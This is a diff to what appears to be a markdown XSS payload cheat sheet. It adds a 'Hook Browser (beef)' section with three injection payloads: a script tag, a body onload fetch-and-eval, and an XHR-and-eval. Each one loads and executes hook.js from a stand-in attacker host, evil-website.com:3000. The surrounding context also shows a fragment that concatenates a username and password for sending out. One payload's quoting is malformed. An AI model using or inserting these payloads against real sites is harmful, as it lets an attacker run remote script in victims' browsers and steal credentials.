@@ -332,6 +332,35 @@ body:username.value+':'+this.value
 />
 ```
 
+### Hook Browser (beef)
+
+```
+<script src="http://evil-website.com:3000/hook.js"></script>
+```
+
+```
+<body
+    onload="fetch('http://evil-website.com:3000/hook.js')
+        .then(response => response.text())
+        .then(script => eval(script))"
+        .catch(error => console.error('Error:', error));
+>
+```
+
+```
+<body
+    onload="
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'http://evil-website.com:3000/hook.js', true);
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState == 4 && xhr.status == 200)
+            eval(xhr.responseText);
+    };
+    xhr.send();
+"
+>
+```
+
 ## Experiment
 
 ### `onresize` event (GET)
